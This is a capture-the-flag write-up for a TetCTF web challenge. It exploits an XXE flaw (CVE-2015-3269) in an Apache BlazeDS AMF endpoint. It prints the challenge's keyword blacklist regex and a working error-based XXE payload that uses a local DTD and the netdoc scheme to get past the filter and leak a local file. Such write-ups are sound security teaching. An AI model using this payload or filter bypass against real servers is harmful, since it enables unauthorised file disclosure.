#### In short
```
python3 solv.py
```

```
 ~/ python3 solv.py
TetCTF{just_hack}
```


#### Explanation

This is AMF service, learning around you can know where the endpoint located
in tetctf.war: WEB-INF/flex/services-config.xml
```
        <channel-definition id="tetctf-amf" class="mx.messaging.channels.AMFChannel">
            <endpoint url="http://{server.name}:{server.port}/{context.root}/messagebroker/amf" class="flex.messaging.endpoints.AMFEndpoint"/>
        </channel-definition>
```
So we can send AMF packet to that endpoint to interactive with the server (google for the AMF packet structure, or refer to genAMF() in solv.py)

Checking the version, it seems vulnerable to CVE-2015-3269
https://codewhitesec.blogspot.com/2015/08/cve-2015-3269-apache-flex-blazeds-xxe.html

The problems here are:
- We cant direct get data from XXE or blind XXE
- Some keywords are blacklisted (SecurityFilter.class)
```
    public static String pattern = "(file|ftp|http|https|data|class|bash|logs|log|conf|etc|session|proc|root|history)";
```

From this article: 
https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/

we can do error xxe thanks to local dtd to leak the data

First pick 1 payload from here
https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md

Then check if yours picked is available in the challenge system, here I pick the `jsp-api.jar` payload

```
root@2be729a9262c:/# find / | grep "\.jar" | grep "jsp-api"
find: '/proc/20/map_files': Permission denied
find: '/proc/22/map_files': Permission denied
find: '/proc/23/map_files': Permission denied
find: '/proc/24/map_files': Permission denied
find: '/proc/25/map_files': Permission denied
/home/service/apache-tomcat-7.0.99/lib/jsp-api.jar
```

Unfortunately we meet the blacklist filter, so we have to find a way to avoid it, well the payload is considered as universal exploit, so it stick with FILE or HTTP stream, somehow in JAVA, you can also read file using netdoc stream
```
<!DOCTYPE message [
		<!ENTITY % local_dtd SYSTEM "jar:netdoc:///home/service/apache-tomcat-7.0.99/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
		<!ENTITY % URI '(aa) #IMPLIED>
			<!ENTITY &#x25; x SYSTEM "netdoc:///home/service/flag.txt">
			<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;_:///abcxyz/&#x25;x;&#x27;>">
			&#x25;eval;
			&#x25;error;
			<!ATTLIST attxx aa "bb"'>
		%local_dtd;
	]>
	<message></message>
```

THen Boom!
